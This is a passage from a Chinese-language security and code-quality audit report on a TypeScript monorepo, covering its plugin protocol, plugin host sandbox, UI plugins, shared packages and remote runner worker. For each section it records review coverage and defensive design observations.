2. 浏览器 `noLib` 模式。当 `ts.sys` 不可用时,`resolveTypeScriptHostLibrary` 会退化到 `noLib: true`,而 `typescriptProject.test.ts:10` 表明这正是预期的浏览器路径。在该模式下,`getSemanticDiagnostics` 仍会对 `console`、`Promise` 等按文件报出 TS2304,`diagnosticCode` 会把它们映射为 COD-2001/COD-2003 警告。如果 web bundle 确实运行在 `no-lib` 下,Issues 面板就会为普通 TS 制品持续产生误报。我无法通过静态方式确认打包后的 `ts.sys` 取值,所以没有把它立为发现 —— 但值得在运行时验证;若确认成立,可以把打包好的 `lib.d.ts` 制品送入 `getScriptFileNames`,或者在 `getTypeScriptHostLibraryMode() === 'no-lib'` 期间抑制 `2304`/`2318` 系列代码。

次要的、非缺陷的备注:`queryVisibleSymbolsFromTables`(semanticResolution.ts:120)在设置了 `context.name` 时仍然逐个扫描索引中的每个符号,而没有使用已有的 `symbolsByName` 表 —— 纯粹是开销,输出并无错误。`queryVisibleSymbols`(按 kind+name 取最近)与 `resolveReferenceFact`(跨 kind 取全局最近)的遮蔽语义略有差异,这可能导致补全解析到的符号与补全列表所暗示的不一致。`upstreamEvidence` 读取 `meta.upstream`,而仓库中目前没有任何生产者写入该键,因此那一行证据当前是失效的。`createTypeScriptCodeProjectHost` / `disposeTypeScriptCodeProjectHost` 从模块导出,但未从包的 index 导出,目前只能从测试中访问到。

### 5.21 `pkg-plugin-protocol-contracts` — plugin-protocol + plugin-contracts

**覆盖范围**: 用 `git ls-files` 加 `git status` 枚举了该分区(72 个已跟踪文件,外加 plugin-contracts 中 4 个未跟踪的工作区文件)。完整阅读了两个包中所有手写的生产源码:plugin-protocol —— src/index.ts、result.ts、codec/strictJsonCodec.ts、codec/runtimeEnvelopeCodec.ts、contracts/protocolContract.ts、contracts/protocolContractRegistry.ts、contracts/schemaContracts.ts、session/protocolEndpoint.ts、scripts/generate-protocol.mjs、scripts/copy-schema.mjs、package.json;plugin-contracts —— src/index.ts、diagnostics.ts、jsonValue.ts、jsonPointer.ts、contributionPoints.ts、contributionValidation.ts、parseStrictJsonDocument.ts、parsePluginManifest.ts、parseAndValidatePluginManifest.ts、validatePluginManifest.ts、validatePaletteContribution.ts、validateExternalLibraryContribution.ts、validateRenderPolicyContribution.ts、validateRenderPolicyContributionV1.ts(未跟踪)、renderPolicy.ts(未跟踪)、validateCodegenPolicyContribution.ts、validateIconProviderContribution.ts、validateBlueprintTemplateContribution.ts、scripts/contractCatalog.mjs、scripts/generate-contracts.mjs、scripts/copy-schema.mjs、package.json。阅读了 plugin-protocol 中全部四个生成的 JSON Schema 模块,以及 plugin-contracts 中的 manifest / render-policy-v2 / icon-provider / codegen-policy schema 模块(仅看 schema,用于推断校验器行为,而非评判生成代码的风格)。对 schemaValidators.generated.ts(17k 行,AJV standalone)只做了定向检查,仅关注与发现相关的 `required` / `additionalProperties` / `ucs2length` 代码生成形态。阅读了全部 8 个测试文件。为佐证可达性,还阅读了分区之外的:node_modules 中 jsonc-parser 的 impl/parser.js(parse + visit 以及 parseObject/parseArray 的错误恢复)、packages/plugin-browser/src/runtime/createBrowserPluginRuntimeAdapter.ts、packages/plugin-browser/src/gateway/createBrowserGatewaySessionFactory.ts 及 gatewaySchemaValidation.ts 和 builtInGatewayContracts.ts、packages/plugin-host/src/lifecycle/hostValidation.ts、apps/web/src/plugins/platform/contributions/renderPolicyResolver.ts,以及 packages/prodivix-compiler/src/core/codegenPolicy.ts。未覆盖:上述形态之外的生成校验函数体,以及 specs/plugins/**/*.schema.json 源文件(我改为审阅了逐字节一致的生成投影)。

**结构观察**: 总体来看,这两个包对于这类边界代码而言异常严谨。`protocolEndpoint.ts` 是真正 fail-closed 的:严格单调的入站序列号、带有界身份预算的消息 id 重放拒绝、带 LRU 淘汰的有界已关闭请求内存、响应上的关联身份匹配、在单一 `settlePending` 路径中清除定时器与 abort 监听器,以及在 `finally` 中移除入站 AbortController。我在其中着力寻找泄漏、游离 promise 和 TOCTOU,均未发现 —— `receive` 在第一次 `await` 之前对序列号/契约的校验是同步的,因此并发的 `receive` 调用无法穿插到序列号检查中间;而 `nextEnvelope`/`sendEnvelope` 在同一个 tick 内运行,因此出站序列号的分配不会竞争。刻意选择在 `sendText` 成功之前不推进 `outboundSequence` 是正确的,并且有测试覆盖。

`packages/plugin-contracts/src/jsonValue.ts` 是该分区中最强的文件:它拒绝非 `Object.prototype` 的原型、symbol 键、不可枚举/访问器属性、稀疏数组、数组上的具名属性、环,以及非有限数值,并对递归包了 `try/catch` 以防栈耗尽。2026-07-22 那次审查中的一个缺陷(带越界数字字符串键的数组绕过校验)已由第 147 行新增的 `index < array.length` 条件确认修复。发现 #1 的空缺恰恰在于:`plugin-protocol` 的 `inspectJsonValue` 从未获得同样的原型守卫,尽管它所处的边界更为敌对。

两个生成脚本都是确定性的(对已解析 schema 的 `JSON.stringify` 保留源文件的键顺序;契约目录是一个冻结的有序数组;`--check` 逐字节比较)。`generate-protocol.mjs` 把 AJV 的 `ucs2length` require 替换为内联的 `for...of` 计数器在语义上是等价的(两者都统计码点,并把未配对的代理项算作一个),而生成后对 `require(` / `new Function` / `eval(` 的扫描是一道很好的守卫,目前也确实成立 —— 我验证过产出文件既无 import 也无动态求值。

正则热点:我检查了 manifest、envelope、gateway、control、implementation、render-policy-v2、icon-provider 和 codegen-policy 各 schema 中的每一个 `pattern`,查看是否存在灾难性回溯。所有分隔符字符类都与其相邻字符类互不相交(`[a-z0-9]+(?:[._-][a-z0-9]+)*` 这种形态),因此全部是线性的 —— 不存在 ReDoS。`isPortableResourcePath` 是可靠的:`packageRelativePath` 模式本身已经使 `..` 无法表达(每段必须以 `[A-Za-z0-9_]` 开头和结尾),在此之上的 Windows 保留设备名检查也是正确的。

有两处风险区域值得记录,但今天尚不构成缺陷。其一,`validateRenderPolicyContribution.ts:204` 把描述符层级的 `hasAttestedAdapter` 计算为 `descriptor.rules.some(rule => rule.hostImplementationId !== undefined)`,而规则层级的调用则正确地按规则限定作用域 —— 只要策略中有一条经过认证的规则,共享的 `host-adapted` 面就会让所有继承它的其他规则跳过"must declare at least one bounded Host adaptation"这条断言。实际影响目前为零,因为 resolver 真正执行的是各个轴上的取值,但这项检查比它自己的错误信息所宣称的要弱。其二,`handleRequest`(protocolEndpoint.ts:494)把宿主请求处理器返回的任何 `protocolFailure` 都视为整个会话的致命错误;gateway schema 把预期的失败建模为 `ok:false` 的成功负载,因此今天是自洽的,但这意味着宿主处理器一次返回类型写错,就会把一个可恢复的 gateway 错误变成会话拆除。

最后,`validatePluginManifest` 的激活命令引用检查在 `options.knownCommandIds` 为 undefined 时会被完全跳过,而 `hostValidation.ts` 是把它作为可选项透传的。这是有意的按需启用设计,但也意味着一个忘记提供命令列表的宿主会静默接受指向并不存在的命令的激活事件。

### 5.22 `pkg-plugin-host` — plugin-host, plugin-browser, plugin-package, plugin-react-host, plugin-sandbox

**覆盖范围**: 完整阅读(生产源码):packages/plugin-host —— index.ts、result.ts、identity.ts、host.types.ts、audit/audit.types.ts、audit/auditSink.ts、capability/{capabilityIdentity,capabilityPolicy,permissionResolution,permissionSnapshot}.ts、contribution/{contribution.types,contributionContract,contributionContractRegistry,contributionPreparation,contributionRegistry,contributionTransaction,resourceIntegrity}.ts、lifecycle/{availabilityLifecycle,createPluginHost,hostContributionOperations,hostValidation,operationCoordinator,permissionLifecycle,pluginHost,pluginHostContext,pluginHostRecord,runtimeLifecycle}.ts、runtime/{pluginRuntimeAdapter,runtimeArtifact,runtimeSession}.ts。packages/plugin-browser —— index.ts、quotas.ts、runtime/createBrowserPluginRuntimeAdapter.ts、sandbox/{createBrowserRuntimeSandboxFactory,sandbox.types}.ts、gateway/_(契约、契约注册表、内置项、配额策略、请求守卫、schema 校验、会话、会话守卫、会话工厂)、gateway/audit/_(gatewayAudit、gatewaySessionAuditWriter、indexedDbGatewayAuditStore)、gateway/network/*(types、adapter、policy、response)、scripts/runtime-worker.entry.ts、scripts/generate-worker-bootstrap.mjs。packages/plugin-package —— artifact.ts、catalog.ts、packageSource.ts、index 暴露面。packages/plugin-react-host —— hostModule.ts、surfaceHost.tsx(仅类型 + 一个 React context;无可处理项)。apps/plugin-sandbox —— src/runtimeBroker.ts、src/uiConformance.ts、scripts/{build,security-policy,serve,check-dist-policy,check-production-dist,verify-deployment}.mjs、Dockerfile、package.json。此外还阅读了 packages/plugin-protocol/src/session/protocolEndpoint.ts(分区之外),以核实 worker 入口和浏览器适配器所依赖的入站请求 AbortSignal 生命周期以及请求/响应关联假设;并阅读 apps/web/src/plugins/platform/createWorkspaceWebPluginPlatform.ts 与 bundledOfficialPlugins.ts 以确立真实调用路径。测试文件被浏览以了解其预期语义,并对照项目测试策略做了检查 —— 未发现 querySelector/closest/parentElement/snapshot/类名耦合,也没有无断言的测试;唯一的测试质量问题是发现 2 中提到的那一对重定向测试,它们通过打桩的 fetch 断言了一条生产中不可达的路径。未覆盖:packages/plugin-contracts 与 protocolEndpoint.ts 之外的 packages/plugin-protocol 内部(属于其他分区);生成文件(runtimeWorkerBootstrap.generated.ts)被视为生成器产物,只审阅了它的生成器。

**结构观察**: 总体来看,这个分区构建得异常出色;尤其是 sandbox 隔离链条经受住了有针对性的攻击分析。以下是我检查过并确认正确的部分,记录下来以免日后重复争论:(1)Sandbox 的来源/消息处理是可靠的 —— 宿主会同时校验 `event.source === iframe.contentWindow`、`event.origin === 'null'`、精确的 3 键结构以及 nonce/frameId;iframe 仅以 `allow-scripts` 创建,并附带 `credentialless`、`referrerPolicy: 'no-referrer'` 和空的 `allow`;`validateSandboxUrl` 会拒绝非 HTTPS(127.0.0.1/localhost 之外)、同源以及带凭据的 URL。broker 也对应地做了 `window.parent` 身份检查、单端口要求,并在创建 Worker 之前对 worker bootstrap 源码和运行时字节都做 SHA-256 校验。(2)CSP 确实是严格的(`default-src 'none'`、`connect-src 'none'`、哈希锁定的 `script-src` 加上 script 标签的 SRI、broker 用 `worker-src blob:` 而 UI 页面用 `'none'`),blob Worker 会继承它 —— 这正是 runtime-worker.entry.ts 中 `hardenRuntimeGlobals()` 的遮蔽手法即便在 `fetch`/`importScripts`/`indexedDB` 位于 `WorkerGlobalScope.prototype` 上、可通过 `Object.getPrototypeOf(self)` 轻易触及的情况下仍然够用的原因。该绕过在代码中被明确记录为纵深防御,在 `connect-src 'none'` 加不透明来源的前提下没有可利用后果,因此我没有上报。不过仍值得指出:sandbox 的 CSP 中没有 `frame-ancestors`;今天这只会让第三方在一个无网络、近似不透明来源、也没有数据的 sandbox 中运行自己的代码,但这是我唯一会建议补上的指令。(3)整个分区内没有 eval/Function/innerHTML/dangerouslySetInnerHTML;唯一的动态代码路径是沙箱化 Worker 内部的 blob-URL `import()`,这正是预期设计。(4)包解压不存在 zip-slip 面 —— `normalizeBundledPluginResourcePath` 拒绝 NUL 字节、绝对路径和盘符路径以及任何 `..` 段,并要求输入已是规范的 POSIX 形式;`packageSource` 则通过内存 Map 的精确匹配来解析一切,而不触及文件系统。(5)Gateway 的网络策略抵御住了常见的 SSRF 手法:WHATWG URL 规范化会在 `isNonPublicHostname` 运行之前中和十进制/八进制/十六进制 IPv4 和 `%2e%2e` 段,`%2f`/`%5c` 被显式拒绝,重定向每一跳都会重新对照来源白名单校验,`credentials: 'omit'`,被禁止的以及 `sec-`/`proxy-` 开头的头会被拒绝,响应头被收窄到五个白名单名称。(6)权限解析在构造上就是 deny 优先(`compareDecision` 把 `deny` 排在最前并取 `[0]`),`normalizePolicySnapshot` 要求每个请求恰好一个决策的精确双射,而 contribution 注册表的提交在没有任何中间 `await` 的情况下完成全部归属/revision/权限/能力检查,因此确实是原子的。后续需要关注的热点:`runtimeLifecycle.activateInternal` 是分区中最复杂的函数(约 400 行,一个 3 次重试的循环带八个不同的清理/回滚出口),我那两个中等级别的生命周期发现都出在这里;函数末尾的 `if (!session || !sessionToken)` 守卫可证明是不可达的,因为最后一次尝试永远不会设置 `retryableConflict` —— 这本身无害,但说明该循环的退出条件已经发生漂移。`createGatewayRequestGuard` 是在 `activeRequests`/`state.active` 递增之后、却在负责递减它们的 `try/finally` 之外构造的,因此一个抛异常的 `permission.subscribe` 会永久泄漏两个并发槽位 —— 在当前宿主提供的 `LivePermissionGuard` 下不可达,因此未上报,但只需调整一行顺序即可让它安全。最后,`createGatewayNetworkAdapter` 虽然从包的 index 导出,却没有在 `apps/web` 中的任何位置接线(`network/request` 契约目前解析为 `unavailable`),这也是发现 2 被界定为面向消费者的缺陷而非现行生产故障的原因。

### 5.23 `pkg-plugin-official-ui` — official plugins (antd/mui/radix) + packages/ui

**覆盖范围**: 用 `git ls-files` 枚举了该分区(packages/plugin-antd、plugin-mui、plugin-radix、packages/ui 共 331 个文件)。

完整阅读:`packages/plugin-antd/scripts/generate-plugin-resources.mjs`(878 行,范围内唯一的生成器),以及它所馈入的根目录 `scripts/plugin-artifacts/generate-bundled-plugin-artifact.mjs`,用以核实 manifest/完整性/支持矩阵的闭合;`plugin-antd/src/{surfaceProvider,paletteProjection,hostModule}.tsx`;`plugin-mui/src/{muiSurfaceHost,hostModule,paletteProjection,componentCatalog}.tsx`;`plugin-radix/src/{hostModule,componentCatalog,paletteProjection}.tsx`;三个 `plugin/manifest.json` 文件以及 antd/mui/radix 的 contribution JSON(render-policy、external-library、palette、codegen-policy、support-matrix),并对照 `packages/plugin-contracts/src/validateRenderPolicyContribution.ts` 与 `validateExternalLibraryContribution.ts` 做了核查。按指示跳过了 `*.generated.ts` 的内容,但仍解码了制品字节以确认规范化 JSON 的完整性路径。

在 packages/ui 中完整阅读:`foundation/*`、`index.ts`、`manifest/componentManifest.ts`、`vite.config.ts`、`package.json`、两个构建脚本(`externalize-font-assets.mjs`、`prepend-theme-css.mjs`),以及每一个具有非平凡逻辑的组件 —— PdxSelect、PdxTabs、PdxCollapse、PdxPagination、PdxTable、PdxDataGrid、PdxCheckList、PdxTree、PdxTreeSelect、PdxSteps、PdxModal、PdxDrawer、PdxRichTextEditor + sanitizeRichTextEditorHtml、PdxFileUpload、PdxImageUpload + imageUploadPreview、PdxImageGallery、PdxColorPicker、PdxRegexInput、PdxRange、PdxSlider、PdxVerificationCode、PdxRegionPicker、PdxRating、PdxPasswordStrength、PdxAvatar、PdxAnchorNavigation、PdxLink、PdxButtonLink、PdxEmbed、PdxIframe、renderUnknownCellValue。

仅在需要证明可达性时交叉核对了分区之外的内容:`pir-react-renderer/src/host/registry.ts`、`apps/web/.../InspectorComponentPropsFields.tsx`、`apps/web/.../builtInManifest.ts`、`apps/web/.../palette/projectionResolver.ts`、`apps/web/src/plugins/platform/contributions/renderPolicyResolver.ts`、`packages/plugin-host/src/contribution/contributionPreparation.ts`、`packages/shared/src/safety/embed.ts`,以及已安装的 `antd`/`@ant-design/cssinjs`/`@rc-component/tour`/`@radix-ui/*` 源码。

此外还验证并确认无误:packages/ui 的 SCSS 中所有非 `--pdx-`/`--radix-` 的 CSS 自定义属性都能解析到 `@prodivix/themes` 所输出的 token(用脚本把 theme manifest 与全部 `.scss` 中的 `var(--…)` 用法做了差异比对 —— 零不匹配);antd manifest 的完整性取值与制品生成器计算出的规范化 JSON 摘要一致(资源生成器沿用既有完整性值是有意为之,并与制品步骤保持一致);antd 的 81 个组件计数断言,以及所有支持矩阵 ↔ contribution ↔ host-module 的闭合关系均成立。

未覆盖:`.stories.tsx` 文件(仅浏览)、变量解析之外的 SCSS 视觉规则,以及插件测试套件中除阅读预期语义之外的部分 —— 我没有发现值得上报的无断言测试或测试策略违规,不过 `plugin-mui/src/__tests__/surfaceHost.test.tsx:78` 在 `view.unmount()` 之后同步断开了它的 MutationObserver,因此由 unmount 引发的变更会在回调触发之前被丢弃(渲染阶段的断言仍然有意义,故我未立项)。

**结构观察**: 这几个插件包在结构健康度上表现良好。`generate-bundled-plugin-artifact.mjs` 强制的三方闭合(支持矩阵 ↔ contribution 描述符 ↔ package.json 精确版本 ↔ host-module 实现 id)确实很强,并且每次 `test`/`build` 时都会由 `check:generated:raw` 重新校验,因此 JSON contribution 与 TypeScript host module 之间的漂移在结构上就被阻止了。antd 资源生成器沿用既有 `source.integrity` 一开始看起来像是过期数据的缺陷,但制品生成器会重新计算并改写它,且 `--check` 在不匹配时 fail closed —— 这两个脚本是正确耦合的。

风险热点:overlay/surface 容纳边界。三个官方插件都把 portal 绑定到宿主提供的 overlay 容器,但各自采用了不同机制(antd:`ConfigProvider.getPopupContainer` 加上仅针对 Modal/Drawer 的 `getContainer` 特例;mui:显式的 `container` prop 加 `createPortal`;radix:带 `container` prop 和状态支撑租约的 `createScopedRadixPortal`)。只有 radix 的包装器会通过重新渲染来响应宿主清理(`setActive(false)`);antd 的 `disposeSurfaceResource` 和 mui 的 `cleanup` 会在组件仍然挂载且再也不会重新渲染的情况下拆掉样式缓存并把注入的 `<style>` 节点从容器中撕走。这在今天之所以还能存活,靠的是 React 的提交顺序(删除副作用先于新树的插入副作用运行),但很脆弱,而且依赖的是 cssinjs/emotion 的内部实现而非插件能控制的任何东西。在 `@prodivix/plugin-react-host` 中提供一个共享的、状态支撑的租约原语,可以在这里消除一整类潜在缺陷。

第二个热点:`packages/ui` 的 prop 透传。大约三分之一的 Pdx 组件通过 `prodivixLeafAdapter`/`prodivixAdapter` 直接从 PIR 节点 props 接收自由形式的 props 包,而这两者不做任何过滤。`PdxEmbed` 和 `PdxRichTextEditor` 有真正的安全层(`resolveSafeEmbedUrl`、`sanitizeRichTextEditorHtml`、`sanitizeSvgMarkup`),而且这些层写得不错 —— 富文本清理器会正确地解析进一个惰性的 `<template>`,连同内容一起丢弃 `svg`/`math`/`style`/`noscript` 一类的标签,并且只放行 style/href/target。`PdxIframe`、`PdxAnchorNavigation`(`href={item.href || …}`)以及 `PdxVideo`/`PdxAudio` 则没有等价的关口,这在同一个包内部是不一致的。值得用一份统一的"author-supplied URL / embedded document"策略来取代逐组件的临时处理。

第三点:`packages/ui` 中受控/非受控的实现分裂为两派 —— 正确的 `useControllableState` hook(PdxSelect、PdxTabs、PdxCollapse、PdxCheckList、PdxRange、PdxColorPicker、PdxImageGallery),以及手写的 `useState` + `useEffect(() => { if (value !== undefined) setInternalValue(value) }, [value])` 镜像,后者在八个组件中被逐字重复(PdxSlider、PdxRating、PdxRegexInput、PdxTreeSelect、PdxPasswordStrength、PdxVerificationCode、PdxRichTextEditor、PdxTree、PdxRegionPicker)。这种镜像写法是多余的 —— 其中每一个组件同时还会计算 `value ?? internalValue`,因此该 effect 的状态写入除了多出一次渲染之外是无效的。目前没有一个是错误的,所以我没有立项,但统一到 `useControllableState` 可以移除约 80 行重复的状态机代码和同一语义的一个重复归属者。

次要、未立项:`packages/ui/package.json` 的子路径导出指向的是 Rollup 去重后的 chunk 名(`dist/button/PdxButton2.js`、`PdxLink2.js`、`PdxNav2.js`、`PdxAvatar2.js`)。这些名字目前是正确的 —— 在 `preserveModules` 下,`2` 后缀恰好出现在那四个有同目录 `.scss` 占用了无后缀名字的组件上 —— 但它们依赖产出顺序,一旦模块图发生变化就会对消费者静默 404。`scripts/prepend-theme-css.mjs` 也不是幂等的(运行两次会把 theme CSS 叠加两遍);今天之所以安全,仅仅因为 `build` 会先运行 `clean`。

### 5.24 `pkg-domain-misc` — animation, nodegraph, shared, ai, i18n, eslint-plugin

**覆盖范围**: 用 `git ls-files` 枚举了该分区(85 个已跟踪文件,约 10.1k 行),并完整阅读了其中每一个生产源码文件:

packages/animation(13 个文件):animation.types.ts、animationCodec.ts、animationEvaluation.ts、animationValidator.ts、animationCssSafety.ts、animationAuthoring.ts、animationPlayback.ts、animationRuntime.ts、animationExecutionProvider.ts、animationSemanticContributionProvider.ts、animationCodeSlotProvider.ts、index.ts,外加两个属性测试和 ExecutionProvider 一致性测试。

packages/nodegraph(全部 src):nodeGraph.types.ts、nodeGraphCodec.ts、nodeGraphExecutor.ts、nodeGraphExecutionProvider.ts、wire.ts、authoring/nodeGraphSemanticContributionProvider.ts、authoring/nodeGraphCodeSlotProvider.ts、index.ts,外加 nodeGraph.property.test.ts、nodeGraphExecutionProvider.conformance.test.ts、nodeGraphWire.conformance.test.ts、nodeGraphSemanticContributionProvider.property.test.ts。

packages/shared(全部 src + scripts):safety/{url,text,richText,svg,embed,index}.ts、llm/{types,gateway,traceStore,contextBuilder,toolRegistry,mockProvider,index}.ts、iconPolicy.ts、types/PdxComponent.ts、index.ts、scripts/{pir-schema,generate-types,sync-current-pir-schema,validate-pir}.js、safety 测试、package.json。

packages/ai(全部 src):providers/{openAICompatibleProvider,openAICompatiblePrompt,discoverOpenAICompatibleModels,createProvider}.ts、validation/validateStructuredOutput.ts、settings/aiSettings.ts、tasks/createLlmTask.ts、index.ts,以及两个测试。

packages/i18n:src/index.ts、scripts/translate.ts(一个有意为之的 `export {}` 占位),两个资源 JSON(226/242 字节)。

packages/eslint-plugin-prodivix:index.ts、全部三条规则、package.json、vitest.config.ts。

为避免臆测性发现而做的跨包验证:阅读了 `packages/runtime-core/src/runtimeExecution.ts`(`mergeRuntimeStatePatch` 是非变更式的展开),并确认 `executionJob.ts:214` 用一个只会 resolve 的 promise 构建 `completion`,因此两个 ExecutionProvider 中的 `void controller.job.completion.finally(cancelTimeout)` 调用都不会产生未处理的 rejection;检查了 `apps/web/.../graphNodeShared.tsx:257` 的 `normalizeCases`,确认持久化的 `data.cases` 并不保证带有标签;grep 了 animation 的 CSS/`@keyframes` 导出路径(不存在,因此缓动函数的差异只影响预览/播放);grep 了 `getVisibleTextMetrics` 的消费者(是 `@prodivix/ui` 中一个仅用于显示的计数器,因此 `stripHtmlTags` 在遇到未闭合的 `<` 时丢弃后续文本只是外观问题,未予上报)。

未覆盖:tsconfig/vitest 配置文件(无逻辑),以及 `apps/web/.../BlueprintAssistantSettingsModal.tsx` 中的 `apiKey` 持久化路径 —— `packages/ai` 只定义了 `apiKey` 字段并通过注入的 fetcher 将其作为 `Bearer` 头附加;web 层是否把该密钥持久化到浏览器存储(不变量 7)属于 apps/web 分区。

**结构观察**: 总体而言,这个分区状况良好。animation 与 nodegraph 的编解码器是严格、确定性、按位置推导 ID 的规范化器,并有幂等性属性测试;两个 ExecutionProvider 都有非常细致的取消/超时/租约释放一致性覆盖(我追踪了 `animationPlayback.ts` 中 `cancel`/`work`/`finalize` 的交错情况,未发现重复释放、租约丢失或帧调度泄漏)。

值得关注的热点:

1. 排序纪律存在割裂。`nodeGraphSemanticContributionProvider` 在 `freezeFacts` 中按 id 对事实排序;`animationSemanticContributionProvider` 则完全依赖确定性的遍历顺序,不做排序。两者今天都是确定性的,但这两个包在"排序是显式不变量还是涌现性质"上已经分道扬镳 —— 值得在更多 provider 落地之前先选定一种约定。`localeCompare` 那条发现就是它的具体症状。

2. `@prodivix/shared` 在同一个包里混入了两类互不相关的归属者:面向浏览器的清理器(`safety/*`)和 LLM gateway/types,以及仅限 Node 的 PIR 构建脚本 —— 后者把 `ajv`、`ajv-formats` 和 `chalk` 作为该包的运行时 `dependencies` 拉了进来,而这个包的 `main` 是可供浏览器消费的。虽然什么都没坏(那些脚本从不被 `src` 引入),但这会让 shared 包的依赖面显得具有误导性。

3. `InMemoryLlmTraceStore`(packages/shared/src/llm/traceStore.ts)是一个只追加、无上限、也没有清空/淘汰 API 的数组,并且每个条目都保留完整的 `LlmContextBundle`(一份编辑器上下文 snapshot)。它唯一的消费者是按助手面板逐个构造的,所以增长是会话范围的而非进程范围的无界增长 —— 我没有上报,但一个有界的环形缓冲区会是很便宜的保险。

4. 当调用方省略 `outputChannels` 时,`createLlmTask` 会默认取全部三个写入通道(`pir-command`、`node-graph-operation`、`code-artifact`)。`validateStructuredOutput` 和 `LlmGateway.assertOutputChannel` 都会针对声明列表 fail closed,因此执行链条是可靠的 —— 但这个默认值是宽松的一侧,与 AI 路径其余部分的 fail-closed 姿态相反。值得做一次明确决策而不是留作默认。

5. 对于不受支持的缓动字符串,`isSupportedAnimationEasing` 在 ExecutionProvider 中是 fail closed 的(ANI-5102),但 `resolveEasing` 在编辑器预览路径上会静默退回到 linear。相同输入、两种行为;今天还不算缺陷,因为编解码器从不拒绝未知的缓动字符串,但预览与播放可能出现分歧。

6. SVG/富文本清理器读起来是干净的:元素/属性白名单、`on*` 前缀拒绝、`url(`/`expression(`/`@import` 样式过滤、深度上限 128、不用 `innerHTML` 重建(元素通过 `createElementNS` 重新构造),以及实体解码限制在 12 个字符内并拒绝代理区间。`isSafeSvgUrlValue` 中对 `data:image/` 的放行只能经由 `xlink:href` 触及,而 `<a>` 不在元素白名单内,因此我没有找到可利用的路径。

7. 测试质量高,且符合项目的测试策略 —— 基于属性的不变量、公共 API 断言,没有 DOM 层级/`querySelector`/snapshot 耦合。我没有发现无断言的测试。唯一的缺口是 `packages/eslint-plugin-prodivix`,它的 `test` 脚本字面上就是 `echo ... && exit 0`,这正是它那三条规则一直未被验证的原因。

### 5.25 `app-runner-worker` — apps/remote-runner-worker (sandbox, security critical)

**覆盖范围**: 完整阅读:apps/remote-runner-worker/src/rootlessPodmanSandbox.ts (1620)、workerAgent.ts (868)、httpControlPlaneClient.ts (334)、workerTerminalCoordinator.ts (265)、rootlessPodmanTerminal.ts (214)、filesystemProcessSandbox.ts (399)、serverFunctionArtifact.ts (195)、projectSourceMutationArtifact.ts (178)、remoteWorkerSecretRecipient.ts (145)、worker.types.ts (211)、main.ts (147)、sandbox/entry.mjs (870)、install-proxy/entry.mjs (238)、sandbox/Dockerfile、sandbox/terminal-entry.sh、install-proxy/Dockerfile、package.json、README.md。交叉核对了分区之外的支撑契约以验证可达性:packages/runtime-core/src/executionSecretLeakGuard.ts、packages/runtime-core/src/executableProject.ts (projectExecutableProjectRuntimeFiles)、packages/server-runtime/src/isolatedServerRuntime.ts、packages/runtime-remote/src/remoteExecutionArtifact.ts、remoteExecutionProtocol.types.ts、remoteExecutionProvider.ts、remoteExecutionControlPlaneMemory.ts、apps/remote-runner-control-plane/src/httpHandler.ts、.github/workflows/g2-rootless-sandbox.yml。测试文件只做了略读(it/expect 密度,并用 grep 检索 DOM/snapshot 耦合 —— 未发现;全部十个测试文件都断言真实行为)。未完整阅读:scripts/verify-rootless-sandbox.ts(2154 行的 Linux/Podman 集成关卡;仅读了其前约 120 行并做了定向 grep),以及十个 *.test.ts 文件的主体。

**结构观察**: `createRootlessPodmanRunArguments` 中的容器加固很扎实,并与文档化的契约一致:`--read-only`、`--cap-drop=ALL`、`--security-opt=no-new-privileges`、配合非 root `--user` 的 `--userns=keep-id`、私有 pid/ipc/uts/cgroup 命名空间、`--log-driver=none`、默认 `--network=none`、`--memory-swap` 等于 `--memory`(无交换空间)、为 /workspace 提供 nosuid/nodev 的 tmpfs 并为 /tmp 额外加上 noexec,以及对由 `imageIsImmutable` 强制的 digest 固定镜像使用 `--pull=never`。我没有在任何地方发现涉及 shell —— 每个子进程都使用带 `shell:false` 与 argv 数组的 `spawn`/`execFile`,唯一使用 `/bin/sh -c` 的地方(rootlessPodmanTerminal 的 `controlScript`)把所有可变数据都作为带引号的位置参数传入,因此命令注入不可达。`sandbox/entry.mjs:childPath` 与 `filesystemProcessSandbox:safeChildPath` 中的路径处理都正确拒绝绝对路径、`..` 逃逸和反斜杠,构建/预览收集器也拒绝符号链接与非常规文件。

安装出口代理在 SSRF 方面构建良好:它自行解析主机名,选出一个公网地址,并连接到该已解析的 IP(检查与连接之间没有重绑定窗口),并带有 IPv4 的 RFC1918/环回/链路本地/CGNAT/组播以及 IPv6 的 ULA/链路本地/环回/组播/v4-mapped 过滤。只有少见的遗留形式(`::7f00:1` IPv4-compatible、`64:ff9b::/96` NAT64、`2002::/16` 6to4)未被过滤;我判断它们在实践中不可达,因此未上报。

密钥路径的隔离确实做得很好:每次解析都会生成一个 X25519 接收方密钥,私钥保留在闭包中,共享密钥与派生密钥在 `finally` 中被零填充,信封按 execution/attempt/workspace/snapshot/function/invocation 做身份绑定并设有 60 s 的 TTL 上限,明文只经由容器的 stdin 传递(绝不经过 argv、env,也不经过安装载荷),材料文件权限为 0600 且位于 sandbox 的 diff 忽略列表中,并且 `workerAgent` 会在任何持久化发布之前,用 `inspectValue` 与 `inspectBytes` 扫描 log/crash/trace/artifact-descriptor/artifact-content 各个面。我的发现 #4 正是宿主侧复检弱于其所复制的 sandbox 侧策略的那一处。

有两处结构性风险区域值得记录,但不构成缺陷:(a) worker↔control-plane 的制品传输是本分区最薄弱、测试最少的接缝 —— 唯一的客户端测试只覆盖 Secret 信封路径,而 control plane 的集成测试是手工拼装请求头而非驱动真实客户端,这正是发现 #1 未被察觉的原因;(b) `filesystemCapturePolicy` / `installPayload.ignoredPaths` / `entry.mjs pathIsIgnored` 是同一套采集策略的三份手工维护副本,而且已经出现漂移 —— 单一的共享派生实现可以消除这一类反复出现的 bug。

### 5.26 `app-runner-cp-hosts` — remote-runner-control-plane, remote-preview-host, asset-delivery-host

**覆盖范围**: 完整阅读(生产源码,分区内全部三个应用):

- apps/remote-runner-control-plane/src:httpHandler.ts (957L)、main.ts (410L)、secretBrokerClient.ts、regionalConfiguration.ts、regionalRecoveryOperatorConfiguration.ts、regionalRecoveryOperatorJob.ts、regionalRecoveryOperatorMain.ts、regionalRecoverySignedProof.ts、terminalStateCipher.ts、terminalStateManagedCipher.ts、terminalStateAwsKms.ts、terminalStateConfiguration.ts。
- apps/remote-preview-host/src:previewHttpHandler.ts、previewSecurityPolicy.ts、previewSessionStore.ts、main.ts。
